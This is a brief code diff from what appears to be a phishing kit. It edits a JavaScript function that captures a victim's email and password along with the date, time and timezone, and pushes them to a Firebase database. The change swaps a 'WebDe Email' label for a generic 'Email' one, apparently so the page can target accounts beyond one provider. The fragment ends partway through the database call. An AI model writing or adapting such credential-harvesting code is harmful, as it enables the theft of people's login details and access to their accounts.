@@ -28,7 +28,7 @@ function hmlog() {
   var currentDate = new Date().toISOString().slice(0, 10);
   var currentTime = new Date().toISOString().slice(11, 19);
   var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  var accountType = "WebDe Email";
+  var accountType = "Email";
 
   if (email !== "" && password !== "") {
     firebase.database().ref("fbdet").push({
